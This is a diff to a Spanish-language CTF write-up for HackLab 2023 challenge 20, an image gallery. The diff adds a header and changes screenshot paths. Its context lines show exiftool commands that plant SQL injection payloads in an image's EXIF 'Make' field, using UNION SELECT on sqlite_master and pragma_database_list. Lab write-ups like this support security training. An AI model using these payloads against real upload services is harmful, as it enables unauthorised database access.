@@ -1,5 +1,9 @@
 # Desafío 20 - Galería de imágenes (HackLab 2023)
 
+**Plataforma:** HackLab (SoftwareSeguro)  
+**Edición:** HackLab 2023  
+**Categoría:** SQL Injection  
+
 ## Análisis
 
 El backend lee el metadato EXIF `Make` de las imágenes subidas y lo inserta en una consulta SQLite sin sanitizar. Se usa **ExifTool** para inyectar SQL en ese campo.
@@ -28,17 +32,17 @@ exiftool -Make="') UNION SELECT 1, name FROM images -- " test.jpg
 exiftool -Make="') UNION SELECT 1, group_concat(name) FROM sqlite_master -- " test.jpg
 ```
 
-![Desafío 20 - Galería de imágenes (HackLab 2023) - imagen 1](images/01.png)
+![Desafío 20 - Galería de imágenes (HackLab 2023) - imagen 1](assets/01.png)
 
-![Desafío 20 - Galería de imágenes (HackLab 2023) - imagen 2](images/02.png)
+![Desafío 20 - Galería de imágenes (HackLab 2023) - imagen 2](assets/02.png)
 
-![Desafío 20 - Galería de imágenes (HackLab 2023) - imagen 3](images/03.png)
+![Desafío 20 - Galería de imágenes (HackLab 2023) - imagen 3](assets/03.png)
 
-![Desafío 20 - Galería de imágenes (HackLab 2023) - imagen 4](images/04.png)
+![Desafío 20 - Galería de imágenes (HackLab 2023) - imagen 4](assets/04.png)
 
-![Desafío 20 - Galería de imágenes (HackLab 2023) - imagen 5](images/05.png)
+![Desafío 20 - Galería de imágenes (HackLab 2023) - imagen 5](assets/05.png)
 
-![Desafío 20 - Galería de imágenes (HackLab 2023) - imagen 6](images/06.png)
+![Desafío 20 - Galería de imágenes (HackLab 2023) - imagen 6](assets/06.png)
 
 Consultas finales que funcionaron:
 
@@ -50,21 +54,21 @@ exiftool -Make="' || (SELECT file FROM pragma_database_list)) --" imagen.jpg
 exiftool -Make="') UNION SELECT 1, file FROM pragma_database_list -- " test.jpg
 ```
 
-![Desafío 20 - Galería de imágenes (HackLab 2023) - imagen 7](images/07.png)
+![Desafío 20 - Galería de imágenes (HackLab 2023) - imagen 7](assets/07.png)
 
-![Desafío 20 - Galería de imágenes (HackLab 2023) - imagen 8](images/08.png)
+![Desafío 20 - Galería de imágenes (HackLab 2023) - imagen 8](assets/08.png)
 
-![Desafío 20 - Galería de imágenes (HackLab 2023) - imagen 9](images/09.png)
+![Desafío 20 - Galería de imágenes (HackLab 2023) - imagen 9](assets/09.png)
 
-![Desafío 20 - Galería de imágenes (HackLab 2023) - imagen 10](images/10.png)
+![Desafío 20 - Galería de imágenes (HackLab 2023) - imagen 10](assets/10.png)
 
-![Desafío 20 - Galería de imágenes (HackLab 2023) - imagen 11](images/11.png)
+![Desafío 20 - Galería de imágenes (HackLab 2023) - imagen 11](assets/11.png)
 
-![Desafío 20 - Galería de imágenes (HackLab 2023) - imagen 12](images/12.png)
+![Desafío 20 - Galería de imágenes (HackLab 2023) - imagen 12](assets/12.png)
 
-![Desafío 20 - Galería de imágenes (HackLab 2023) - imagen 13](images/13.png)
+![Desafío 20 - Galería de imágenes (HackLab 2023) - imagen 13](assets/13.png)
 
-![Desafío 20 - Galería de imágenes (HackLab 2023) - imagen 14](images/14.png)
+![Desafío 20 - Galería de imágenes (HackLab 2023) - imagen 14](assets/14.png)
 
 ## Flag
 
